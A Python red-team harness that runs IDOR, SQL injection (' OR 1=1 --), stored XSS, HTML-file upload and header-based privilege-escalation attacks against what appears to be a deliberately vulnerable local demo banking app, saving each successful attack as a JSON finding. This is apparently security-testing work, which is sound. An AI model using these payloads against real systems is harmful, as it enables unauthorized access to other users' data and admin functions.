import os
import sys
import json
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime

# Import session auth helper
sys.path.append(os.path.join(os.path.dirname(__file__), "..", ".."))
from shared.auth_helper import get_session_cookie

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

class RedTeamAttackEngine:
    def __init__(self, target_base_url="http://127.0.0.1:3000"):
        self.target_base_url = target_base_url.rstrip("/")
        self.alice_cookie = get_session_cookie(self.target_base_url, "Alice", "password123")

    def run_idor_attack(self):
        """
        Attempts to access Bob's user profile (ID: 2) while authenticated as Alice.
        """
        print("[🔴 RED TEAM] Running BOLA/IDOR Attack on /api/users/2...")
        url = f"{self.target_base_url}/api/users/2"
        headers = {"Cookie": self.alice_cookie}
        
        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req) as resp:
                status_code = resp.getcode()
                body = resp.read().decode('utf-8')
                data = json.loads(body)

                user_obj = data.get("user", {})
                if user_obj.get("username") == "Bob" or user_obj.get("email") == "bob@securebank.local":
                    print("  [!] IDOR EXPLOIT SUCCESSFUL! Alice accessed Bob's profile data.")
                    finding = {
                        "id": "VULN-001",
                        "type": "IDOR",
                        "endpoint": "/api/users/2",
                        "http_method": "GET",
                        "severity": "high",
                        "description": "Authenticated user can access another user's profile data via ID manipulation.",
                        "reproduction": {
                            "headers": headers,
                            "payload": {},
                            "url_params": {},
                            "test_user": "Alice"
                        },
                        "evidence": {
                            "status_code": status_code,
                            "response_body": body,
                            "extracted_data": f"Exfiltrated profile for user {user_obj.get('username')}: email {user_obj.get('email')}"
                        },
                        "timestamp": datetime.utcnow().isoformat() + "Z"
                    }
                    self._save_finding(finding)
                    return finding
                else:
                    print("  [-] IDOR Attack failed or authorization enforced.")
                    return None
        except urllib.error.HTTPError as e:
            print(f"  [-] Attack blocked with HTTP {e.code}")
            return None
        except Exception as e:
            print(f"  [-] Attack error: {e}")
            return None

    def run_sqli_attack(self):
        """
        Attempts SQL injection on transaction search.
        """
        print("[🔴 RED TEAM] Running SQL Injection Attack on /api/transactions/search...")
        payload = "' OR 1=1 --"
        encoded_query = urllib.parse.quote(payload)
        url = f"{self.target_base_url}/api/transactions/search?q={encoded_query}"
        headers = {"Cookie": self.alice_cookie}
        
        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req) as resp:
                status_code = resp.getcode()
                body = resp.read().decode('utf-8')
                data = json.loads(body)

                transactions = data.get("transactions", [])
                charlie_tx = next((tx for tx in transactions if tx.get("description") == "Dinner"), None)
                if charlie_tx is not None:
                    print("  [!] SQLi EXPLOIT SUCCESSFUL! Dumped transactions outside Alice's account.")
                    finding = {
                        "id": "VULN-002",
                        "type": "SQLI",
                        "endpoint": "/api/transactions/search",
                        "http_method": "GET",
                        "severity": "critical",
                        "description": "Unsanitized query input in search endpoint allows SQL injection.",
                        "reproduction": {
                            "headers": headers,
                            "payload": {},
                            "url_params": {"q": payload},
                            "test_user": "Alice"
                        },
                        "evidence": {
                            "status_code": status_code,
                            "response_body": body,
                            "extracted_data": f"Exfiltrated transaction '{charlie_tx.get('description')}' of account {charlie_tx.get('to_account_id')}."
                        },
                        "timestamp": datetime.utcnow().isoformat() + "Z"
                    }
                    self._save_finding(finding)
                    return finding
                else:
                    print("  [-] SQLi Attack failed or query parameterized.")
                    return None
        except urllib.error.HTTPError as e:
            print(f"  [-] SQLi Attack blocked with HTTP {e.code}")
            return None
        except Exception as e:
            print(f"  [-] SQLi Attack error: {e}")
            return None

    def run_xss_attack(self):
        """
        Attempts Stored XSS injection on money transfer description.
        """
        print("[🔴 RED TEAM] Running Stored XSS Attack on /api/transfers...")
        url = f"{self.target_base_url}/api/transfers"
        payload = {"to_account_number": "ACC-1002", "amount": 1, "description": "<img src=x onerror=\"alert('XSS-DEMO')\">"}
        headers = {"Cookie": self.alice_cookie, "Content-Type": "application/json"}
        
        req = urllib.request.Request(url, data=json.dumps(payload).encode('utf-8'), headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req) as resp:
                status_code = resp.getcode()
                body = resp.read().decode('utf-8')
                
                # Check if payload was accepted and saved
                if status_code == 200:
                    print("  [!] Stored XSS EXPLOIT SUCCESSFUL! Transfer memo payload accepted.")
                    finding = {
                        "id": "VULN-003",
                        "type": "XSS",
                        "endpoint": "/api/transfers",
                        "http_method": "POST",
                        "severity": "medium",
                        "description": "Unsanitized transfer memo enables Stored XSS script execution.",
                        "reproduction": {
                            "headers": headers,
                            "payload": payload,
                            "url_params": {},
                            "test_user": "Alice"
                        },
                        "evidence": {
                            "status_code": status_code,
                            "response_body": body,
                            "extracted_data": "Payload '<img src=x onerror=...>' stored without sanitization."
                        },
                        "timestamp": datetime.utcnow().isoformat() + "Z"
                    }
                    self._save_finding(finding)
                    return finding
        except Exception as e:
            print(f"  [-] XSS Attack error: {e}")
            return None

    def run_file_upload_attack(self):
        """
        Attempts Unsafe File Upload with HTML/script content.
        """
        print("[🔴 RED TEAM] Running Unsafe File Upload Attack on /api/profile/upload...")
        url = f"{self.target_base_url}/api/profile/upload"
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body_str = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="test-malicious.html"\r\n'
            f"Content-Type: text/html\r\n\r\n"
            f"<script>alert('XSS-DEMO')</script>\r\n"
            f"--{boundary}--\r\n"
        )
        headers = {
            "Cookie": self.alice_cookie,
            "Content-Type": f"multipart/form-data; boundary={boundary}"
        }
        
        req = urllib.request.Request(url, data=body_str.encode('utf-8'), headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req) as resp:
                status_code = resp.getcode()
                res_body = resp.read().decode('utf-8')
                data = json.loads(res_body)
                if data.get("file", {}).get("original_name") == "test-malicious.html":
                    print("  [!] Unsafe File Upload EXPLOIT SUCCESSFUL! .html file uploaded.")
                    finding = {
                        "id": "VULN-004",
                        "type": "FILE_UPLOAD",
                        "endpoint": "/api/profile/upload",
                        "http_method": "POST",
                        "severity": "high",
                        "description": "Server lacks file extension allowlist, permitting HTML file uploads.",
                        "reproduction": {
                            "headers": headers,
                            "payload": {"filename": "test-malicious.html"},
                            "url_params": {},
                            "test_user": "Alice"
                        },
                        "evidence": {
                            "status_code": status_code,
                            "response_body": res_body,
                            "extracted_data": f"Uploaded file {data.get('file', {}).get('stored_name')}"
                        },
                        "timestamp": datetime.utcnow().isoformat() + "Z"
                    }
                    self._save_finding(finding)
                    return finding
        except Exception as e:
            print(f"  [-] File Upload Attack error: {e}")
            return None

    def run_admin_escalation_attack(self):
        """
        Attempts Privilege Escalation via X-Admin-Override header.
        """
        print("[🔴 RED TEAM] Running Privilege Escalation Attack on /api/admin/users...")
        url = f"{self.target_base_url}/api/admin/users"
        headers = {
            "Cookie": self.alice_cookie,
            "X-Admin-Override": "true"
        }
        
        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req) as resp:
                status_code = resp.getcode()
                body = resp.read().decode('utf-8')
                data = json.loads(body)
                if status_code == 200 and "users" in data:
                    print("  [!] Privilege Escalation EXPLOIT SUCCESSFUL! Bypassed admin check via header.")
                    finding = {
                        "id": "VULN-005",
                        "type": "PRIVILEGE_ESCALATION",
                        "endpoint": "/api/admin/users",
                        "http_method": "GET",
                        "severity": "critical",
                        "description": "Client-supplied X-Admin-Override header bypasses admin authentication check.",
                        "reproduction": {
                            "headers": headers,
                            "payload": {},
                            "url_params": {},
                            "test_user": "Alice"
                        },
                        "evidence": {
                            "status_code": status_code,
                            "response_body": body,
                            "extracted_data": f"Accessed {len(data.get('users', []))} admin user accounts."
                        },
                        "timestamp": datetime.utcnow().isoformat() + "Z"
                    }
                    self._save_finding(finding)
                    return finding
        except Exception as e:
            print(f"  [-] Privilege Escalation error: {e}")
            return None

    def _save_finding(self, finding):
        output_dir = os.path.join(os.path.dirname(__file__), "..", "reports")
        os.makedirs(output_dir, exist_ok=True)
        finding_file = os.path.join(output_dir, f"{finding['id']}_finding.json")
        with open(finding_file, "w") as f:
            json.dump(finding, f, indent=2)
        print(f"  [+] Finding saved to {finding_file}")

if __name__ == "__main__":
    engine = RedTeamAttackEngine()
    engine.run_idor_attack()
    engine.run_sqli_attack()
    engine.run_xss_attack()
    engine.run_file_upload_attack()
    engine.run_admin_escalation_attack()
